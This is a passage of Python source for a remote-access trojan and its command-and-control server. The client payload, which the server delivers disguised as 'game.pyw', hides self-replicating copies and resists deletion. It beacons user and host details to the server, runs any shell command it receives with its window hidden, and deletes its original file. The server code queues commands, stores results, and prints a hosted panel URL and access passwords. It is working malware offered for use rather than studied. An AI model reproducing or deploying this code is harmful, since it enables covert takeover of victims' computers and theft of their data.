                    # إصلاح النسخ التالفة
                    for damaged_copy in damaged_copies:
                        self.hidden_copies.remove(damaged_copy)
                        self.recreate_copy(damaged_copy)
                    
                    # التأكد من وجود 3 نسخ على الأقل
                    if len(self.hidden_copies) < 3:
                        print("🔄 إنشاء نسخ إضافية للوصول إلى الحد الأدنى")
                        self.create_infinite_copies()
                    
                    time.sleep(5)  # فحص كل 5 ثواني
                    
                except Exception as e:
                    print(f"❌ خطأ في المراقبة: {e}")
                    time.sleep(10)
        
        # بدء عدة خيوط مراقبة
        for i in range(3):
            thread = threading.Thread(target=monitor_copies, daemon=True)
            thread.start()
            self.monitor_threads.append(thread)
        
        print("🔄 بدء نظام المراقبة المتبادلة (3 خيوط)")
    
    def recreate_copy(self, copy_path):
        """إعادة إنشاء نسخة تالفة"""
        try:
            if os.path.dirname(copy_path) and os.path.exists(os.path.dirname(copy_path)):
                # استخدام اسم جديد للنسخة
                new_name = self.get_unique_system_name()
                new_path = os.path.join(os.path.dirname(copy_path), new_name)
                
                shutil.copy2(self.original_path, new_path)
                self.encrypt_file(new_path)
                
                try:
                    subprocess.run(f'attrib +s +h +r "{new_path}"', shell=True, capture_output=True)
                except:
                    pass
                
                self.hidden_copies.append(new_path)
                print(f"✅ تم إعادة إنشاء: {os.path.basename(new_path)}")
                
        except Exception as e:
            print(f"❌ فشل إعادة الإنشاء: {e}")
    
    def start_eternal_communication(self):
        """بدء اتصال أبدي مع خادم التحكم"""
        def communication_worker():
            backoff = 3
            
            while self.running:
                try:
                    if not self.registered:
                        system_info = {
                            'client_id': self.client_id,
                            'computer': platform.node(),
                            'user': getpass.getuser(),
                            'os': f"{platform.system()} {platform.release()}",
                            'status': 'eternal_active',
                            'admin': self.is_admin(),
                            'copies': len(self.hidden_copies),
                            'timestamp': time.time(),
                            'type': 'infinite_system'
                        }
                        
                        response = self.session.post(
                            f"{self.server_url}/register",
                            json=system_info,
                            timeout=self.timeout,
                            verify=False
                        )
                        
                        if response.status_code == 200:
                            self.registered = True
                            backoff = 3
                            print("✅ تم التسجيل في النظام الأبدي")
                        else:
                            backoff = min(backoff * 1.2, 60)
                    
                    # فحص الأوامر
                    self.check_commands()
                    
                    time.sleep(backoff)
                    
                except Exception as e:
                    backoff = min(backoff * 1.2, 60)
                    time.sleep(backoff)
        
        # بدء عدة خيوط اتصال
        for i in range(2):
            thread = threading.Thread(target=communication_worker, daemon=True)
            thread.start()
            self.monitor_threads.append(thread)
    
    def check_commands(self):
        """فحص الأوامر من خادم التحكم"""
        try:
            response = self.session.get(
                f"{self.server_url}/commands",
                params={'client': self.client_id, '_t': int(time.time()*1000)},
                timeout=15,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('command'):
                    command_data = data['command']
                    print(f"🎮 أمر: {command_data}")
                    
                    result = self.execute_command(command_data)
                    self.send_response(command_data, result)
                    
        except Exception:
            pass
    
    def execute_command(self, command):
        """تنفيذ الأمر"""
        try:
            if command.strip() == "sysinfo":
                return self.get_system_info()
            elif command.strip() == "status":
                return self.get_status()
            elif command.strip() == "reinforce":
                return self.reinforce_system()
            elif command.strip() == "locations":
                return self.get_locations_info()
            elif command.strip() == "eternal_status":
                return self.get_eternal_status()
            elif command.strip() == "independent_status":
                return self.get_independent_status()
            elif command.strip() == "delete_original":
                result = self.delete_original_and_switch_to_backup()
                return "✅ تم حذف الملف الأصلي والتبديل للنسخ الاحتياطية" if result else "❌ فشل الحذف"
            
            # تنفيذ أوامر النظام
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                startupinfo=startupinfo
            )
            
            output = result.stdout if result.stdout else result.stderr
            return output or "✅ executed"
            
        except Exception as e:
            return f"❌ error: {str(e)}"
    
    def send_response(self, command, result):
        """إرسال نتيجة الأمر"""
        try:
            response_data = {
                'client_id': self.client_id,
                'command': command,
                'response': result,
                'timestamp': time.time()
            }
            
            self.session.post(
                f"{self.server_url}/response",
                json=response_data,
                timeout=10,
                verify=False
            )
            
        except Exception:
            pass
    
    def get_system_info(self):
        """الحصول على معلومات النظام"""
        try:
            independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
            original_exists = os.path.exists(self.original_path)
            
            info = f"""
🔒 INFINITE PERMANENT SYSTEM - ETERNAL
🖥️  Computer: {platform.node()}
👤 User: {getpass.getuser()}
💻 OS: {platform.system()} {platform.release()}
🆔 System ID: {self.client_id}
🌐 Server: {self.server_url}

🔧 ETERNAL STATUS:
✅ Active Copies: {len(self.hidden_copies)}
✅ Independent Copies: {independent_copies}
✅ Unique Names: {len(self.used_names)}
✅ Admin Rights: {'YES' if self.is_admin() else 'NO'}
✅ Mutual Monitoring: ACTIVE (3 threads)
✅ Encryption: ENABLED
✅ Persistence: ETERNAL

📊 OPERATIONAL:
🔄 Connection: {'ESTABLISHED' if self.registered else 'ESTABLISHING'}
⚡ Uptime: {self.get_uptime()}
🛡️ Protection: INFINITE + INDEPENDENT
🗑️  Original File: {'EXISTS' if original_exists else 'DELETED'}

💾 SYSTEM HEALTH:
📈 CPU: {psutil.cpu_percent()}%
🧠 Memory: {psutil.virtual_memory().percent}%
💽 Disk: {psutil.disk_usage('/').percent}%

🤖 INDEPENDENT SYSTEM:
🔒 Survives Deletion: YES
🔄 Auto-Replication: ACTIVE
📁 Backup Locations: {len(self.replication.system_locations)}
🎯 Auto-Delete: ENABLED
"""
            return info
        except:
            return "Infinite System Information"
    
    def get_independent_status(self):
        """الحصول على حالة النظام المستقل"""
        existing_copies = [loc for loc in self.replication.system_locations if os.path.exists(loc)]
        status = {
            'independent_system': True,
            'backup_locations': len(self.replication.system_locations),
            'active_backups': len(existing_copies),
            'survives_deletion': len(existing_copies) >= 3,
            'protection_active': True,
            'auto_delete_enabled': True,
            'timestamp': time.time()
        }
        return json.dumps(status, indent=2)
    
    def get_eternal_status(self):
        """الحصول على حالة النظام الأبدي"""
        status = {
            'system_id': self.client_id,
            'active_copies': len(self.hidden_copies),
            'unique_names': list(self.used_names),
            'monitoring_threads': len(self.monitor_threads),
            'connection_status': self.registered,
            'uptime': self.get_uptime(),
            'timestamp': time.time(),
            'version': 'INFINITE_1.0',
            'independent_system': True,
            'auto_delete': True
        }
        return json.dumps(status, indent=2)
    
    def get_status(self):
        independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
        original_exists = os.path.exists(self.original_path)
        status = "♾️ INFINITE + INDEPENDENT"
        status += f" - Copies: {len(self.hidden_copies)}"
        status += f" - Independent: {independent_copies}"
        status += f" - Connected: {self.registered}"
        status += f" - Original: {'EXISTS' if original_exists else 'DELETED'}"
        return status
    
    def get_uptime(self):
        try:
            uptime_seconds = time.time() - psutil.boot_time()
            days = int(uptime_seconds // 86400)
            hours = int((uptime_seconds % 86400) // 3600)
            return f"{days}d {hours}h"
        except:
            return "ETERNAL"
    
    def get_locations_info(self):
        locations_info = "📍 INFINITE COPIES LOCATIONS:\n"
        for i, path in enumerate(self.hidden_copies, 1):
            locations_info += f"{i}. {os.path.basename(path)} → {os.path.dirname(path)}\n"
        
        locations_info += "\n🤖 INDEPENDENT BACKUP LOCATIONS:\n"
        for i, path in enumerate(self.replication.system_locations, 1):
            exists = "✅" if os.path.exists(path) else "❌"
            locations_info += f"{i}. {exists} {os.path.basename(path)} → {os.path.dirname(path)}\n"
        
        locations_info += f"\n🗑️  ORIGINAL FILE: {'✅ EXISTS' if os.path.exists(self.original_path) else '❌ DELETED'}\n"
        return locations_info
    
    def reinforce_system(self):
        try:
            copies_count = self.create_infinite_copies()
            persistence_count = self.install_eternal_persistence()
            independent_count = self.install_independent_replication_system()
            return f"♾️ ETERNAL REINFORCEMENT:\n- Created {copies_count} infinite copies\n- Added {persistence_count} eternal methods\n- Installed {independent_count} independent system\n- System SURVIVES DELETION\n- Auto-Delete: ENABLED"
        except Exception as e:
            return f"Reinforcement failed: {e}"
    
    def start_eternal_system(self):
        """بدء النظام الأبدي"""
        print("♾️ STARTING INFINITE PERMANENT SYSTEM...")
        print("=" * 60)
        
        # 1. إخفاء النافذة
        self.hide_console()
        
        # 2. إنشاء النسخ اللانهائية
        print("📁 CREATING INFINITE COPIES...")
        self.create_infinite_copies()
        
        if not self.hidden_copies:
            print("⚠️  USING CURRENT INSTANCE AS BASE")
            self.hidden_copies.append(self.original_path)
            self.main_copy_path = self.original_path
        
        # 3. تثبيت الاستمرارية الأبدية
        print("🔧 INSTALLING ETERNAL PERSISTENCE...")
        self.install_eternal_persistence()
        
        # 4. تثبيت النظام المستقل (الميزة الجديدة)
        print("🤖 INSTALLING INDEPENDENT REPLICATION SYSTEM...")
        self.install_independent_replication_system()
        
        # 5. بدء المراقبة المتبادلة
        print("🔄 STARTING MUTUAL MONITORING...")
        self.start_mutual_monitoring()
        
        # 6. بدء الاتصال الأبدي
        print("🌐 STARTING ETERNAL COMMUNICATION...")
        self.start_eternal_communication()
        
        # 7. حذف الملف الأصلي تلقائياً بعد 10 ثواني
        print("⏰ SCHEDULING AUTO-DELETE OF ORIGINAL FILE...")
        def auto_delete():
            time.sleep(10)
            self.delete_original_and_switch_to_backup()
        
        delete_thread = threading.Thread(target=auto_delete, daemon=True)
        delete_thread.start()
        
        print("=" * 60)
        print("♾️ INFINITE PERMANENT SYSTEM IS NOW ACTIVE")
        print("🔒 SYSTEM IS ETERNAL - CANNOT BE STOPPED")
        print("🤖 INDEPENDENT - SURVIVES DELETION")
        print("🗑️  AUTO-DELETE - ORIGINAL WILL BE DELETED SHORTLY")
        print("📡 LISTENING FOR ETERNAL COMMANDS...")
        print("=" * 60)
        
        # الحلقة الأبدية
        self.eternal_loop()
    
    def eternal_loop(self):
        """الحلقة الأبدية"""
        loop_count = 0
        while self.running:
            try:
                loop_count += 1
                if loop_count % 30 == 0:  # كل 5 دقائق تقريباً
                    independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
                    original_exists = os.path.exists(self.original_path)
                    print(f"♾️ Eternal system active - Loop #{loop_count}")
                    print(f"   Independent: {independent_copies} copies")
                    print(f"   Original: {'EXISTS' if original_exists else 'DELETED'}")
                
                time.sleep(10)
                
            except Exception as e:
                print(f"♾️ Eternal system recovered from error: {e}")
                time.sleep(5)

# === التشغيل الأبدي ===
def main():
    try:
        system = InfinitePermanentSystem()
        system.start_eternal_system()
    except Exception as e:
        print(f"♾️ System rebirth: {e}")
        # إعادة التشغيل التلقائي
        time.sleep(10)
        main()

if __name__ == "__main__":
    print("♾️ INFINITE PERMANENT SYSTEM - ETERNAL EDITION")
    print("🤖 NOW WITH INDEPENDENT REPLICATION - SURVIVES DELETION")
    print("🗑️  AUTO-DELETE FEATURE - ORIGINAL FILE WILL BE DELETED")
    print("🔒 THIS SYSTEM CANNOT BE STOPPED - EVEN IF DELETED")
    main()'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="game.pyw"')
        self.end_headers()
        self.wfile.write(client_code.encode())

    def handle_client_register(self, data):
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            client_ip = self.client_address[0]
            incoming_user = data.get('user', 'Unknown')
            incoming_computer = data.get('computer', 'Unknown')
            incoming_os = data.get('os', 'Unknown')

            if incoming_user == 'Unknown' and '-' in client_id:
                try:
                    parts = client_id.split('-')
                    if len(parts) >= 2:
                        incoming_user = parts[1]
                        incoming_computer = parts[0]
                except:
                    pass
                
            existing_client = None
            for cid, client_data in self.sessions.items():
                current_user = client_data.get('user', '')
                current_computer = client_data.get('computer', '')

                if (current_user == incoming_user and 
                    current_computer == incoming_computer and 
                    incoming_user != 'Unknown' and 
                    incoming_computer != 'Unknown'):
                    existing_client = cid
                    break
                
            if existing_client is None and client_id in self.sessions:
                existing_client = client_id

            if existing_client:
                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
                self.sessions[existing_client]['status'] = 'online'
                self.sessions[existing_client]['ip'] = client_ip

                if incoming_os != 'Unknown':
                    self.sessions[existing_client]['os'] = incoming_os

                print(f"✅ INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
            else:
                self.sessions[client_id] = {
                    'id': client_id,
                    'ip': client_ip,
                    'type': data.get('type', 'unknown'),
                    'computer': incoming_computer,
                    'os': incoming_os,
                    'user': incoming_user,
                    'first_seen': datetime.now().isoformat(),
                    'last_seen': datetime.now().isoformat(),
                    'pending_command': None,
                    'last_response': None,
                    'status': 'online'
                }
                print(f"🆕 INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
                self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                
    def send_sessions_list(self):
        with self.session_lock:
            current_time = datetime.now()
            active_clients = []
        
            for client_id, client_data in list(self.sessions.items()):
                last_seen = datetime.fromisoformat(client_data['last_seen'])
                time_diff = (current_time - last_seen).total_seconds()
            
                if time_diff < 300:  # 5 minutes
                    client_data['is_online'] = time_diff < 10  # ⚡ 10 seconds for online
                    client_data['last_seen_seconds'] = time_diff
                    active_clients.append(client_data)
                else:
                    del self.sessions[client_id]
                    print(f"INSTANT Removed inactive: {client_id}")
        
            self.send_json(active_clients)    
    def handle_get_commands(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            client_id = query.get('client', [None])[0]
            
            if client_id and client_id in self.sessions:
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                pending_command = self.sessions[client_id]['pending_command']
                
                if pending_command:
                    self.sessions[client_id]['pending_command'] = None
                    self.send_json({'command': pending_command, 'instant': True})
                else:
                    self.send_json({'waiting': False, 'instant': True})
            else:
                self.send_json({'error': 'Client not found', 'instant': True})
    
    def handle_execute_command(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['pending_command'] = command
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                self.send_json({'success': True, 'executed_instantly': True})
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'INSERT INTO commands (client_id, command) VALUES (?, ?)',
                        (client_id, command)
                    )
                    self.conn.commit()
            else:
                self.send_json({'success': False, 'error': 'Client not found'})
    
    def handle_get_result(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            
            client_id = query.get('client', [''])[0]
            command = query.get('command', [''])[0]
            
            if client_id in self.sessions and self.sessions[client_id]['last_response']:
                result = self.sessions[client_id]['last_response']
                self.sessions[client_id]['last_response'] = None
                self.send_json({'result': result, 'instant': True})
            else:
                self.send_json({'pending': True, 'instant': True})
    
    def handle_client_response(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            response = data.get('response')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['last_response'] = response
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'UPDATE commands SET response = ? WHERE client_id = ? AND command = ? AND response IS NULL',
                        (response, client_id, command)
                    )
                    self.conn.commit()
            
            self.send_json({'success': True, 'instant': True})
    
    def send_command_history(self):
        try:
            if hasattr(self, 'cursor'):
                self.cursor.execute('''
                    SELECT client_id, command, response, timestamp 
                    FROM commands 
                    ORDER BY timestamp DESC 
                    LIMIT 50
                ''')
                history = self.cursor.fetchall()
                
                result = []
                for row in history:
                    result.append({
                        'client_id': row[0],
                        'command': row[1],
                        'response': row[2],
                        'timestamp': row[3]
                    })
                
                self.send_json(result)
            else:
                self.send_json([])
        except:
            self.send_json([])
    
    def send_system_status(self):
        with self.session_lock:
            status = {
                'uptime': 'Running - INSTANT MODE',
                'connected_clients': len([c for c in self.sessions.values() 
                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 30]),
                'total_commands': 0,
                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'mode': 'INSTANT',
                'response_time': '0ms'
            }
            
            if hasattr(self, 'cursor'):
                self.cursor.execute('SELECT COUNT(*) FROM commands')
                status['total_commands'] = self.cursor.fetchone()[0]
            
            self.send_json(status)
    
    def send_404_page(self):
        self.send_error(404, "Page not found")
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('X-Response-Time', '0ms')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def instant_cleanup_sessions():
    """INSTANT session cleanup"""
    while True:
        try:
            current_time = datetime.now()
            with EnhancedRemoteControlHandler.session_lock:
                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
                    last_seen = datetime.fromisoformat(client_data['last_seen'])
                    if (current_time - last_seen).total_seconds() > 300:
                        del EnhancedRemoteControlHandler.sessions[client_id]
            time.sleep(30)  # ⚡ Clean every 30 seconds
        except:
            pass

def main():
    handler = EnhancedRemoteControlHandler
    handler.init_database(handler)
    
    threading.Thread(target=instant_cleanup_sessions, daemon=True).start()
    
    print("=" * 80)
    print("🔒 ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
    print("=" * 80)
    print("Control Panel:     https://game-python-1.onrender.com")
    print("Python Client:     https://game-python-1.onrender.com/download-python-client")
    print("Security Settings: https://game-python-1.onrender.com/settings")
    print("Level 1 Password: hblackhat")
    print("Level 2 Password: sudohacker")
    print("Database:         remote_control.db")
    print("=" * 80)
    print("⚡ INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
    print("🎯 All commands execute immediately without delay")
    print("🚀 Ultra-fast communication and execution")
    print("=" * 80)
    
    try:
        server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
        print("🚀 Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
        print("⚡ Features: Instant Execution, 0ms Delay, Real-time Responses")
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()
